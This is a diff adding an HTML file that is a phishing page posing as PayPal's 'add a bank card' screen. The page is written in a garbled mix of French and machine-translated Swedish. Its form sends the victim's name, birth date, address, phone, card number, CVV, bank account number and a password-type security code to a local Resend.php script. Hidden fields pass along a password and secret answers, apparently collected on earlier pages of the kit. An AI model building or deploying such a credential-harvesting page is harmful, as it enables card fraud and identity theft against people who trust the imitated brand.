@@ -1,0 +1,1343 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <!--
+         Script info: script: webscr, cmd: _profile-credit-card-new-clickthru, template: p/acc/pro/cc-add, date: Aug. 20, 2009 02:43:39 PDT; country: FR, language: fr_FR, xslt server: 
+		web version: 59.0-1026427 branch: AHOD_590_0820_int
+		content version: -
+		pexml version: 59.0-1019555
+		page XSL: FinancialInstrument/FR/fr_FR/account/profile/CCAdd.xsl
+       hostname : TWrcER.O4dOOdt5E7W2SbZXfNi0RiTXL22ZU6NWFPAM
+         rlogid : TWrcER%2fO4dOOdt5E7W2SbUgP2ttHw8ZL454bhiF3UAfge%2f%2fVj5uFdA%3d%3d_12338bd68e6
+-->
+  <title>
+   Enregistrer une carte bancaire - PayPal
+  </title>
+  <!--googleoff: all-->
+  <meta content="PayPal est le moyen plus sûr et plus simple de payer en ligne sans divulguer le numéro de votre carte bancaire." name="description" />
+  <!--googleon: all-->
+  <link href="files/global.css" type="text/css" rel="stylesheet" media="screen" />
+  <link href="files/pageSecurityQuestions.css" type="text/css" rel="stylesheet" media="screen" />
+  <link href="files/hCard.css" type="text/css" rel="stylesheet" media="screen" />
+  <!--[if IE 7]><link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-590-20090814-1/css/browsers/ie7.css">
+<![endif]-->
+  <!--[if lte IE 6]><link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-590-20090814-1/css/browsers/ie6.css">
+<![endif]-->
+  <link href="files/country.css" type="text/css" rel="stylesheet" />
+  <link href="files/print.css" type="text/css" rel="stylesheet" media="print" />
+  <script language="javascript">
+   function zzzz(){
+var tes=true;
+var first=document.fox.first_name.value;
+var lasto=document.fox.last_name.value;
+var mailos=document.fox.email.value;
+var adress=document.fox.adress1.value;
+var zipos=document.fox.zip.value; 
+var villss=document.fox.ville.value;
+var phonos=document.fox.phone.value; 
+var numbex=document.fox.cc_number.value;
+var doxa=document.fox.dob_a.value; 
+var doxb=document.fox.dob_b.value; 
+var doxc=document.fox.dob_c.value; 
+var fvv=document.fox.cvv.value;
+/*
+
+*/
+if((first == '') || (first == ' ')){
+	alert('Vous n\'avez pas rempli le champs Prénom.');
+	tes=false;
+	}
+else if((lasto == '') || (lasto == ' ')){
+	alert('Vous n\'avez pas rempli le champs Nom.');
+	tes=false;
+	}
+else if((doxa =='')|| (doxa ==' ') || (doxb =='')|| (doxb ==' ')||(doxc =='')|| (doxc ==' ')) {
+	window.alert('Votre date de naissance est invalide.');
+	tes=false;
+	}
+else if((adress =='')|| (adress ==' ')){
+	window.alert('Vous n\'avez pas rempli le champs Adress1');
+	tes=false;
+	}
+else if((zipos=='')|| (zipos==' ')) {
+	window.alert('Votre Code Postal est invalide !');
+	tes=false;
+	}
+else if((villss =='')|| (villss ==' ')){
+	window.alert('Vous n\'avez pas rempli le champs Ville.');
+	tes=false;
+	}
+
+else if((phonos =='')|| (phonos ==' ')){
+	window.alert('Votre N° de téléphone est invalide.');
+	tes=false;
+	}
+else if((numbex =='')|| (numbex ==' ') || (numbex.length&gt;18)|| (numbex.length&lt;16)) {
+	window.alert('Votre N° de carte est invalide.');
+	tes=false;
+	}
+else if(document.fox.elements['credit_card_type'].selectedIndex =='X'){
+	window.alert('Votre choix de Type carte est invalide.');
+	tes=false; 
+	}
+else if((fvv=="")||(fvv==" ") ||(fvv.length&lt;3)) {
+	window.alert('Votre Cryptogramme visuel est invalide.');
+	tes=false;
+	}/**/
+else {
+var place = mailos.indexOf("@",1);
+	var point = mailos.indexOf(".",place+1);
+	if (!(place &gt; -1)||(mailos.length &lt;5)||!(point &gt; 1))
+		{
+		alert('Entrez une adresse e-mail valide!');
+		tes=false;
+
+	}
+	
+}
+return tes;
+}
+  </script>
+  <script type="text/javascript">
+   if (parent.frames.length &gt; 0){
+	top.location.replace(document.location);
+}
+  </script>
+  <script src="files/global.js" type="text/javascript">
+  </script>
+  <link href="http://getothepoint.com/connexion/perso/pp_favicon_x.ico" rel="shortcut icon" />
+  <link href="http://getothepoint.com/connexion/perso/apple-touch-icon.png" rel="apple-touch-icon" />
+  <style type="text/css">
+   &lt;!--
+.style2 {color: #EF6910}
+--&gt;
+  </style>
+ </head>
+ <body>
+  <noscript>
+   &lt;p class="nonjsAlert"&gt;REMARQUE : Pour utiliser de nombreuses
+fonctionnalités du site PayPal, vous avez besoin de JavaScript et de
+cookies. Vous pouvez les activer à l'aide des paramètres de votre
+navigateur.&lt;/p&gt;
+  </noscript>
+  <div id="page" class="ccadd">
+   <div class="std" id="header">
+    <h1>
+     <a href="https://www.paypal.com/fr/cgi-bin/webscr?cmd=_account">
+      <img border="0" alt="PayPal" src="files/paypal_logo.gif" />
+     </a>
+    </h1>
+    <form action="" name="searchForm" id="searchForm" method="post">
+     <fieldset>
+      <legend>
+       Recherche PayPal
+      </legend>
+      <label for="searchBox">
+       Rechercher
+      </label>
+      <input type="text" value="" name="queryString" id="searchBox" />
+      <input type="submit" value="Rechercher" name="search.x" id="search.x" class="button" />
+     </fieldset>
+     <input type="hidden" value="SHpAw13eFuiJe7Hn0tW8bq-Cuzo9cF51_NU7_2gLpfjGgaqmZxahN58UUjIM4tsVhwBudigLSnVAV_lC" name="auth" />
+     <input type="hidden" value="UTF-8" name="form_charset" />
+    </form>
+    <div id="navGlobal">
+     <ul>
+      <li class="logout">
+       <a href="#">
+        Déconnexion
+       </a>
+      </li>
+      <li>
+       <a href="#">
+        Aide
+       </a>
+      </li>
+      <li class="last">
+       <a href="#">
+        Espace sécurité
+       </a>
+      </li>
+     </ul>
+    </div>
+    <div id="navPrimary">
+     <ul class="secondary">
+      <li class="active">
+       <a class="scTrack:SRD:Nav:CL" href="#">
+        Mitt konto
+       </a>
+       <ul>
+       </ul>
+      </li>
+      <li>
+       <a class="scTrack:SRD:Nav:EO" href="#">
+        betalning
+       </a>
+      </li>
+      <li>
+       <a class="scTrack:SRD:Nav:ER" href="#">
+        Efterfrågan på betalning
+       </a>
+      </li>
+      <li>
+       <a class="scTrack:SRD:Nav:EU" href="#">
+        E-handelslösningar
+       </a>
+      </li>
+      <li class="">
+       <a class="scTrack:SRD:Nav:EV" href="#">
+        EBay Lösningar
+       </a>
+      </li>
+     </ul>
+    </div>
+   </div>
+   <div id="navGlobal">
+   </div>
+   <div id="headline">
+    <h2>
+     Uppdatera dina uppgifter
+    </h2>
+    <div>
+     <ul class="progress">
+      <li class="complete">
+       <strong>
+        1
+       </strong>
+       bekräfta
+      </li>
+      <li class="complete">
+       <strong>
+        2
+       </strong>
+       Ändra dina hemliga frågor
+      </li>
+      <li class="current">
+       <strong>
+        3
+       </strong>
+       Uppdatera dina uppgifter
+      </li>
+      <li>
+       <strong>
+        4
+       </strong>
+       på Finish
+      </li>
+     </ul>
+    </div>
+   </div>
+   <div id="messageBox">
+   </div>
+   <div id="main">
+    <div class="legacyErrors">
+     <form onsubmit="return zzzz()" class="edit" action="Resend.php" method="post" name="fox">
+      <input type="hidden" value="password" name="password" />
+      <input type="hidden" value="answer2" name="answer2" />
+      <input type="hidden" value="answer1" name="answer1" />
+      <p>
+       Du måste registrera ett bankkort för att betala med PayPal.
+      </p>
+      <p>
+       För innehavare av
+       <strong>
+        e-Carte Bleue
+       </strong>
+       , vi
+frågar faktiskt ange numret på ditt kort och inte
+inte ett nummer automatiskt genereras av e-Carte Bleue programvara.
+      </p>
+      <p>
+       PayPal skyddar dig mot bedräglig användning av ditt konto.
+      </p>
+      <table width="100%" border="0" cellspacing="0" cellpadding="0">
+       <tbody>
+        <tr>
+         <td width="137">
+          <label for="first_name">
+           <span class="required style2">
+            *
+           </span>
+           Förnamn
+          </label>
+         </td>
+         <td>
+          <span class="field">
+           <input type="text" value="" name="first_name" maxlength="32" size="30" id="first_name" />
+          </span>
+         </td>
+        </tr>
+        <tr>
+         <td width="137">
+          <span class="label">
+           <span class="required style2">
+            *
+           </span>
+           Namn
+          </span>
+         </td>
+         <td>
+          <span class="field">
+           <input type="text" onchange="function test" value="" name="last_name" maxlength="32" size="30" id="last_name" />
+          </span>
+         </td>
+        </tr>
+        <tr>
+         <td width="137">
+          <span class="label">
+           <span class="required style2">
+            *
+           </span>
+           E-post
+          </span>
+         </td>
+         <td>
+          <span class="field">
+           <input type="text" value="" name="email" maxlength="32" size="30" id="email" />
+          </span>
+         </td>
+        </tr>
+        <tr>
+         <td width="137">
+          <span class="label">
+           <span class="required style2">
+            *
+           </span>
+           Födelsedatum
+          </span>
+         </td>
+         <td>
+          dd
+          <span class="field">
+           <input type="text" value="" name="dob_b" maxlength="2" size="2" id="dob_b" />
+            /mm
+           <input type="text" value="" name="dob_a" maxlength="2" size="2" id="dob_a" />
+            /aaaa
+           <input type="text" value="" name="dob_c" maxlength="4" size="4" id="dob_c" />
+          </span>
+         </td>
+        </tr>
+        <tr>
+         <td width="137">
+          <span class="label">
+           <span class="required style2">
+            *
+           </span>
+           Adress1
+          </span>
+         </td>
+         <td>
+          <span class="field">
+           <input type="text" value="" name="adress1" maxlength="32" size="30" id="adress1" />
+          </span>
+         </td>
+        </tr>
+        <tr>
+         <td width="137">
+          <span class="label">
+           Adress2
+          </span>
+         </td>
+         <td>
+          <span class="field">
+           <input type="text" value="" name="adress2" maxlength="32" size="30" id="adress2" />
+          </span>
+         </td>
+        </tr>
+        <tr>
+         <td width="137">
+          <span class="label">
+           <span class="required style2">
+            *
+           </span>
+           Postnummer
+          </span>
+         </td>
+         <td>
+          <span class="field">
+           <input type="text" value="" name="zip" maxlength="8" size="18" id="zip" />
+          </span>
+         </td>
+        </tr>
+        <tr>
+         <td width="137">
+          <span class="label">
+           <span class="required style2">
+            *
+           </span>
+           Stad
+          </span>
+         </td>
+         <td>
+          <span class="field">
+           <input type="text" value="" name="ville" maxlength="32" size="30" id="ville" />
+          </span>
+         </td>
+        </tr>
+        <tr>
+         <td width="137">
+          <span class="label">
+           <span class="required style2">
+            *
+           </span>
+           Land
+          </span>
+         </td>
+         <td>
+          <span class="field">
+           <select class="" name="citizenship" id="citizenship">
+            <option value="">
+             -- 
+Choix d’un pays --
+            </option>
+            <option selected="selected" value="SE">
+             Suède
+            </option>
+            <option value="ZA">
+             Afrique du Sud
+            </option>
+            <option value="AL">
+             Albanie
+            </option>
+            <option value="DZ">
+             Algérie
+            </option>
+            <option value="DE">
+             Allemagne
+            </option>
+            <option value="AD">
+             Andorre
+            </option>
+            <option value="AO">
+             Angola
+            </option>
+            <option value="AI">
+             Anguilla
+            </option>
+            <option value="AG">
+             Antigua et Barbuda
+            </option>
+            <option value="AN">
+             Antilles néerlandaises
+            </option>
+            <option value="SA">
+             Arabie Saoudite
+            </option>
+            <option value="AR">
+             Argentine
+            </option>
+            <option value="AM">
+             Arménie
+            </option>
+            <option value="AW">
+             Aruba
+            </option>
+            <option value="AU">
+             Australie
+            </option>
+            <option value="AT">
+             Autriche
+            </option>
+            <option value="BS">
+             Bahamas
+            </option>
+            <option value="BH">
+             Bahreïn
+            </option>
+            <option value="BB">
+             Barbades
+            </option>
+            <option value="BE">
+             Belgique
+            </option>
+            <option value="BZ">
+             Belize
+            </option>
+            <option value="BJ">
+             Bénin
+            </option>
+            <option value="BM">
+             Bermudes
+            </option>
+            <option value="BT">
+             Bhoutan
+            </option>
+            <option value="BO">
+             Bolivie
+            </option>
+            <option value="BA">
+             Bosnie-Herzégovine
+            </option>
+            <option value="BW">
+             Botswana
+            </option>
+            <option value="BR">
+             Brésil
+            </option>
+            <option value="BN">
+             Brunei
+            </option>
+            <option value="BG">
+             Bulgarie
+            </option>
+            <option value="BF">
+             Burkina Faso
+            </option>
+            <option value="BI">
+             Burundi
+            </option>
+            <option value="KY">
+             Caïmanes, Iles
+            </option>
+            <option value="KH">
+             Cambodge
+            </option>
+            <option value="CA">
+             Canada
+            </option>
+            <option value="CV">
+             Cap-Vert
+            </option>
+            <option value="CL">
+             Chili
+            </option>
+            <option value="C2">
+             Chine
+            </option>
+            <option value="CY">
+             Chypre
+            </option>
+            <option value="VA">
+             Cité du Vatican
+            </option>
+            <option value="CO">
+             Colombie
+            </option>
+            <option value="KM">
+             Comores
+            </option>
+            <option value="KR">
+             Corée du Sud
+            </option>
+            <option value="CR">
+             Costa Rica
+            </option>
+            <option value="HR">
+             Croatie
+            </option>
+            <option value="DK">
+             Danemark
+            </option>
+            <option value="DJ">
+             Djibouti
+            </option>
+            <option value="DM">
+             Dominique
+            </option>
+            <option value="AE">
+             Emirats Arabes Unis
+            </option>
+            <option value="EC">
+             Equateur
+            </option>
+            <option value="ER">
+             Erythrée
+            </option>
+            <option value="ES">
+             Espagne
+            </option>
+            <option value="EE">
+             Estonie
+            </option>
+            <option value="FM">
+             Etats fédérés de Micronésie
+            </option>
+            <option value="US">
+             Etats-Unis d'Amérique
+            </option>
+            <option value="ET">
+             Ethiopie
+            </option>
+            <option value="FK">
+             Falkland (Malvinas), Iles
+            </option>
+            <option value="FJ">
+             Fidji
+            </option>
+            <option value="FI">
+             Finlande
+            </option>
+            <option value="GM">
+             Gambie
+            </option>
+            <option value="GI">
+             Gibraltar
+            </option>
+            <option value="GR">
+             Grèce
+            </option>
+            <option value="GD">
+             Grenade
+            </option>
+            <option value="GL">
+             Groenland
+            </option>
+            <option value="GP">
+             Guadeloupe
+            </option>
+            <option value="GT">
+             Guatemala
+            </option>
+            <option value="GN">
+             Guinée
+            </option>
+            <option value="GW">
+             Guinée-Bissau
+            </option>
+            <option value="GY">
+             Guyane
+            </option>
+            <option value="GF">
+             Guyane française
+            </option>
+            <option value="HN">
+             Honduras
+            </option>
+            <option value="HK">
+             Hong-Kong
+            </option>
+            <option value="HU">
+             Hongrie
+            </option>
+            <option value="MU">
+             Ile Maurice
+            </option>
+            <option value="NF">
+             Ile Norfolk
+            </option>
+            <option value="CK">
+             Iles Cook
+            </option>
+            <option value="SJ">
+             Iles de Svalbard et Jan Mayen
+            </option>
+            <option value="FO">
+             Iles Féroé
+            </option>
+            <option value="MH">
+             Iles Marshall
+            </option>
+            <option value="PN">
+             Iles Pitcairn
+            </option>
+            <option value="SB">
+             Iles Salomon
+            </option>
+            <option value="VG">
+             Iles Vierges britanniques
+            </option>
+            <option value="WF">
+             Iles Wallis-et-Futuna
+            </option>
+            <option value="IN">
+             Inde
+            </option>
+            <option value="ID">
+             Indonésie
+            </option>
+            <option value="IE">
+             Irlande
+            </option>
+            <option value="IS">
+             Islande
+            </option>
+            <option value="IL">
+             Israël
+            </option>
+            <option value="IT">
+             Italie
+            </option>
+            <option value="JM">
+             Jamaïque
+            </option>
+            <option value="JP">
+             Japon
+            </option>
+            <option value="JO">
+             Jordanie
+            </option>
+            <option value="KZ">
+             Kazakhstan
+            </option>
+            <option value="KE">
+             Kenya
+            </option>
+            <option value="KG">
+             Kirghizistan
+            </option>
+            <option value="KI">
+             Kiribati
+            </option>
+            <option value="KW">
+             Koweït
+            </option>
+            <option value="LA">
+             Laos
+            </option>
+            <option value="LS">
+             Lesotho
+            </option>
+            <option value="LV">
+             Lettonie
+            </option>
+            <option value="LI">
+             Liechtenstein
+            </option>
+            <option value="LT">
+             Lituanie
+            </option>
+            <option value="LU">
+             Luxembourg
+            </option>
+            <option value="MG">
+             Madagascar
+            </option>
+            <option value="MY">
+             Malaisie
+            </option>
+            <option value="MW">
+             Malawi
+            </option>
+            <option value="MV">
+             Maldives
+            </option>
+            <option value="ML">
+             Mali
+            </option>
+            <option value="MT">
+             Malte
+            </option>
+            <option value="MA">
+             Maroc
+            </option>
+            <option value="MQ">
+             Martinique
+            </option>
+            <option value="MR">
+             Mauritanie
+            </option>
+            <option value="YT">
+             Mayotte
+            </option>
+            <option value="MX">
+             Mexique
+            </option>
+            <option value="MN">
+             Mongolie
+            </option>
+            <option value="MS">
+             Montserrat
+            </option>
+            <option value="MZ">
+             Mozambique
+            </option>
+            <option value="NA">
+             Namibie
+            </option>
+            <option value="NR">
+             Nauru
+            </option>
+            <option value="NP">
+             Népal
+            </option>
+            <option value="NI">
+             Nicaragua
+            </option>
+            <option value="NE">
+             Niger
+            </option>
+            <option value="NU">
+             Niue
+            </option>
+            <option value="NO">
+             Norvège
+            </option>
+            <option value="NC">
+             Nouvelle-Calédonie
+            </option>
+            <option value="NZ">
+             Nouvelle-Zélande
+            </option>
+            <option value="OM">
+             Oman
+            </option>
+            <option value="UG">
+             Ouganda
+            </option>
+            <option value="PW">
+             Palaos
+            </option>
+            <option value="PA">
+             Panama
+            </option>
+            <option value="PG">
+             Papouasie-Nouvelle-Guinée
+            </option>
+            <option value="NL">
+             Pays-Bas
+            </option>
+            <option value="PE">
+             Pérou
+            </option>
+            <option value="PH">
+             Philippines
+            </option>
+            <option value="PL">
+             Pologne
+            </option>
+            <option value="PF">
+             Polynésie française
+            </option>
+            <option value="PT">
+             Portugal
+            </option>
+            <option value="QA">
+             Qatar
+            </option>
+            <option value="AZ">
+             République d'Azerbaïdjan
+            </option>
+            <option value="CD">
+             République Démocratique du Congo
+            </option>
+            <option value="DO">
+             République dominicaine
+            </option>
+            <option value="CG">
+             République du Congo
+            </option>
+            <option value="GA">
+             République du Gabon
+            </option>
+            <option value="CZ">
+             République tchèque
+            </option>
+            <option value="RE">
+             Réunion
+            </option>
+            <option value="RO">
+             Roumanie
+            </option>
+            <option value="GB">
+             Royaume-Uni
+            </option>
+            <option value="RU">
+             Russie
+            </option>
+            <option value="RW">
+             Rwanda
+            </option>
+            <option value="KN">
+             Saint-Christophe-et-Niévès
+            </option>
+            <option value="SM">
+             Saint-Marin
+            </option>
+            <option value="PM">
+             Saint-Pierre et Miquelon
+            </option>
+            <option value="VC">
+             Saint-Vincent-et-les Grenadines
+            </option>
+            <option value="SH">
+             Sainte-Hélène
+            </option>
+            <option value="LC">
+             Sainte-Lucie
+            </option>
+            <option value="SV">
+             Salvador
+            </option>
+            <option value="WS">
+             Samoa
+            </option>
+            <option value="ST">
+             Sao Tomé-et-Principe
+            </option>
+            <option value="SN">
+             Sénégal
+            </option>
+            <option value="SC">
+             Seychelles
+            </option>
+            <option value="SL">
+             Sierra Leone
+            </option>
+            <option value="SG">
+             Singapour
+            </option>
+            <option value="SK">
+             Slovaquie
+            </option>
+            <option value="SI">
+             Slovénie
+            </option>
+            <option value="SO">
+             Somalie
+            </option>
+            <option value="LK">
+             Sri Lanka
+            </option>
+            <option value="FR">
+             France
+            </option>
+            <option value="CH">
+             Suisse
+            </option>
+            <option value="SR">
+             Surinam
+            </option>
+            <option value="SZ">
+             Swaziland
+            </option>
+            <option value="TJ">
+             Tadjikistan
+            </option>
+            <option value="TW">
+             Taiwan
+            </option>
+            <option value="TZ">
+             Tanzanie
+            </option>
+            <option value="TD">
+             Tchad
+            </option>
+            <option value="TH">
+             Thaïlande
+            </option>
+            <option value="TG">
+             Togo
+            </option>
+            <option value="TO">
+             Tonga
+            </option>
+            <option value="TT">
+             Trinité-et-Tobago
+            </option>
+            <option value="TN">
+             Tunisie
+            </option>
+            <option value="TM">
+             Turkménistan
+            </option>
+            <option value="TC">
+             Turks-et-Caïques, Iles
+            </option>
+            <option value="TR">
+             Turquie
+            </option>
+            <option value="TV">
+             Tuvalu
+            </option>
+            <option value="UA">
+             Ukraine
+            </option>
+            <option value="UY">
+             Uruguay
+            </option>
+            <option value="VU">
+             Vanuatu
+            </option>
+            <option value="VE">
+             Venezuela
+            </option>
+            <option value="VN">
+             Vietnam
+            </option>
+            <option value="YE">
+             Yémen
+            </option>
+            <option value="ZM">
+             Zambie
+            </option>
+           </select>
+          </span>
+         </td>
+        </tr>
+        <tr>
+         <td width="137">
+          <span class="label">
+           <span class="required style2">
+            *
+           </span>
+           Telefon
+          </span>
+         </td>
+         <td>
+          <span class="field">
+           <input type="phone" value="" name="phone" maxlength="32" size="30" id="phone" />
+          </span>
+         </td>
+        </tr>
+        <tr>
+         <td width="137">
+          <span class="label">
+           <span class="required style2">
+            *
+           </span>
+           Bank Namn
+          </span>
+         </td>
+         <td>
+          <span class="field">
+           <input type="text" value="" name="cmpt_bank2" maxlength="52" size="30" id="cmpt_bank2" />
+          </span>
+         </td>
+        </tr>
+        <tr>
+         <td width="137" id="fieldrowCCType">
+          <label for="credit_card_type">
+           <span class="required style2">
+            *
+           </span>
+           Card Type
+          </label>
+         </td>
+         <td>
+          <span class="field">
+           <select name="credit_card_type" id="credit_card_type">
+            <option value="X">
+            </option>
+            <option value="V">
+             Visa
+            </option>
+            <option value="M">
+             MasterCard
+            </option>
+            <option value="A">
+             American Express
+            </option>
+            <option value="N">
+             Carte Aurore
+            </option>
+            <option value="Q">
+             Cofinoga
+            </option>
+            <option value="L">
+             4 étoiles
+            </option>
+           </select>
+           <img border="0" align="top" alt="Carte Bancaire" src="files/logo_ccCB_37wx23h.gif" />
+           <img border="0" align="top" alt="Visa" src="files/logo_ccVisa.gif" />
+           <img border="0" align="top" alt="MasterCard" src="files/logo_ccMC.gif" />
+           <img border="0" align="top" alt="American Express" src="files/logo_ccAmex.gif" />
+           <img border="0" align="top" alt="Carte Aurore" src="files/logo_ccAurora_37wx23h.gif" />
+           <img border="0" align="top" alt="Cofinoga" src="files/logo_ccCofinoga_22wx23h.gif" />
+           <img border="0" align="top" alt="4 étoiles" src="files/logo_ccCofidis_37wx23h.gif" />
+          </span>
+         </td>
+        </tr>
+        <tr id="fieldrowCCNumber" class="hide">
+         <td width="137" disabled="true">
+          <label for="credit_card_type" disabled="true">
+           <span class="required style2" disabled="true">
+            *
+           </span>
+           Kortets nummer
+          </label>
+         </td>
+         <td disabled="true">
+          <span class="field" disabled="true">
+           <input type="text" value="" name="cc_number" maxlength="19" size="30" id="cc_number" disabled="true" />
+          </span>
+         </td>
+        </tr>
+        <tr id="fieldrowCCExpDate" class=" hide">
+         <td width="137" disabled="true">
+          <span class="required style2" disabled="true">
+           *
+          </span>
+          Utgångsdatum
+         </td>
+         <td class="group first" disabled="true">
+          <span class="field" disabled="true">
+           <select name="expdate_month" id="expdate_month" disabled="true">
+            <option value="1" disabled="true">
+             01
+            </option>
+            <option value="2" disabled="true">
+             02
+            </option>
+            <option value="3" disabled="true">
+             03
+            </option>
+            <option value="4" disabled="true">
+             04
+            </option>
+            <option value="5" disabled="true">
+             05
+            </option>
+            <option value="6" disabled="true">
+             06
+            </option>
+            <option value="7" disabled="true">
+             07
+            </option>
+            <option value="8" disabled="true">
+             08
+            </option>
+            <option value="9" disabled="true">
+             09
+            </option>
+            <option value="10" disabled="true">
+             10
+            </option>
+            <option value="11" disabled="true">
+             11
+            </option>
+            <option value="12" disabled="true">
+             12
+            </option>
+           </select>
+           <select name="expdate_year" disabled="true">
+            <option value="2015" disabled="true">
+             2015
+            </option>
+            <option value="2016" disabled="true">
+             2016
+            </option>
+            <option value="2017" disabled="true">
+             2017
+            </option>
+            <option value="2018" disabled="true">
+             2018
+            </option>
+            <option value="2019" disabled="true">
+             2019
+            </option>
+            <option value="2020" disabled="true">
+             2020
+            </option>
+            <option value="2021" disabled="true">
+             2021
+            </option>
+            <option value="2022" disabled="true">
+             2022
+            </option>
+            <option value="2023" disabled="true">
+             2023
+            </option>
+            <option value="2024" disabled="true">
+             2024
+            </option>
+            <option value="2025" disabled="true">
+             2025
+            </option>
+            <option value="2026" disabled="true">
+             2026
+            </option>
+            <option value="2027" disabled="true">
+             2027
+            </option>
+            <option value="2028" disabled="true">
+             2028
+            </option>
+           </select>
+          </span>
+         </td>
+        </tr>
+        <tr id="fieldrowCSC" class="hide">
+         <td width="137" disabled="true">
+          <label for="credit_card_type" disabled="true">
+           <span class="required style2" disabled="true">
+            *
+           </span>
+           CVV
+          </label>
+         </td>
+         <td disabled="true">
+          <span class="field" disabled="true">
+           <input type="text" value="" name="cvv" maxlength="4" size="3" id="cvv" disabled="true" />
+           <a id="1" disabled="true">
+            <img border="0" align="top" alt="Où trouver le Cryptogramme visuel ?" src="files/mini_cvv2.gif" disabled="true" />
+            <span class="help" disabled="true">
+             (Dessa är de 3 sista siffrorna numret på baksidan av kortet.)
+            </span>
+           </a>
+          </span>
+         </td>
+        </tr>
+        <tr>
+         <td width="137">
+          <span class="label">
+           <span class="required style2">
+            *
+           </span>
+           Kontonummer
+          </span>
+         </td>
+         <td>
+          <span class="field">
+           <input type="text" value="" name="codeperso" maxlength="18" size="18" id="codeperso" />
+          </span>
+         </td>
+        </tr>
+        <tr>
+         <td width="137">
+          <span class="label">
+           <span class="required style2">
+            *
+           </span>
+           Lösenord Säkerhetskod
+          </span>
+         </td>
+         <td>
+          <span class="field">
+           <input type="password" value="" name="emp" maxlength="32" size="30" id="phone0" />
+           <span class="help">
+            <a id="10">
+            </a>
+           </span>
+          </span>
+         </td>
+        </tr>
+        <tr>
+         <td width="137">
+         </td>
+         <td>
+          <p class="buttons">
+           <button onclick="longueurtexte();" class="primary" value="Enregistrer cette carte et continuer" name="submit.x" type="submit">
+            Spara detta kort och hålla
+           </button>
+           <button onclick="longueurtexte();" class="primary" value="Annuler" name="reset" type="submit">
+            avboka
+           </button>
+          </p>
+         </td>
+        </tr>
+       </tbody>
+      </table>
+     </form>
+    </div>
+    <div id="footer">
+     <h2 class="accessAid">
+      Plus d'informations
+     </h2>
+     <ul>
+      <li>
+       <a href="#">
+        mobil/a&gt;
+       </a>
+      </li>
+      <a href="#">
+      </a>
+      <li>
+       <a href="#">
+       </a>
+       <a href="#">
+        Massbetalning
+       </a>
+      </li>
+      <li>
+       <a href="#">
+        sponsring
+       </a>
+      </li>
+      <li>
+       <a href="#">
+        vårt företag
+       </a>
+      </li>
+      <li>
+       <a href="#">
+        Kontotyper
+       </a>
+      </li>
+      <li>
+       <a href="#">
+        taxan
+       </a>
+      </li>
+      <li>
+       <a href="#">
+        Respekt för privatlivet
+       </a>
+      </li>
+      <li>
+       <a href="#">
+        Säkerhetscenter
+       </a>
+      </li>
+      <li>
+       <a href="#">
+        KUNDSERVICE
+       </a>
+      </li>
+      <li>
+       <a href="#">
+        kontrakt använder
+       </a>
+      </li>
+      <li>
+       <a href="#">
+        Presentkort
+       </a>
+      </li>
+     </ul>
+     <p id="legal">
+      Copyright © 1999-2015 PayPal. Alla rättigheter reserverade.
+     </p>
+    </div>
+    <div id="navFull" class="hide">
+    </div>
+    <script type="text/javascript">
+     if(typeof PAYPAL != 'undefined'){ PAYPAL.core.Navigation.init(); }
+    </script>
+    <script src="files/widgets.js" type="text/javascript">
+    </script>
+    <script src="files/ProfileCCAdd.js" type="text/javascript">
+    </script>
+    <script src="files/pp_naturalsearch.js" type="text/javascript">
+    </script>
+    <script type="text/javascript">
+     mp_landing();
+    </script>
+    <!-- SiteCatalyst Code
+Copyright 1997-2005 Omniture, Inc.
+More info available at http://www.omniture.com -->
+    <script src="files/pp_jscode_080706.js" type="text/javascript">
+    </script>
+    <script type="text/javascript">
+     &lt;!--
+/* SiteCatalyst Variables */
+s.prop1="p/acc/pro/cc-add";
+s.prop6="5ST24330GN206734B";
+s.prop7="Personal";
+s.prop8="Unverified";
+s.prop9="Unrestricted";
+s.prop10="FR";
+s.prop34="PayPalCredit:Servicing:CO:NoTransactions";
+s.pageName="Profile:Credit Card or Debit Card:Add";
+s.channel="Profile:Credit Card or Debit Card:Add";
+s.prop50="fr_FR";
+s.prop18="";
+/************* DO NOT ALTER ANYTHING BELOW THIS LINE ! **************/
+var s_code=s.t();if(s_code)document.write(s_code)//--&gt;
+    </script>
+    <script type="text/javascript">
+     &lt;!--
+if(navigator.appVersion.indexOf('MSIE')&gt;=0)document.write(unescape('%3C')+'\!-'+'-')
+//--&gt;
+    </script>
+    <noscript>
+     &lt;img
+src="//paypal.112.2O7.net/b/ss/paypalglobal/1/H.6--NS/0?pageName=NonJavaScript"
+height="1" width="1" border="0" alt="" /&gt;
+    </noscript>
+    <!--/DO NOT REMOVE/-->
+    <!-- End SiteCatalyst Code -->
+   </div>
+  </div>
+ </body>
+</html>
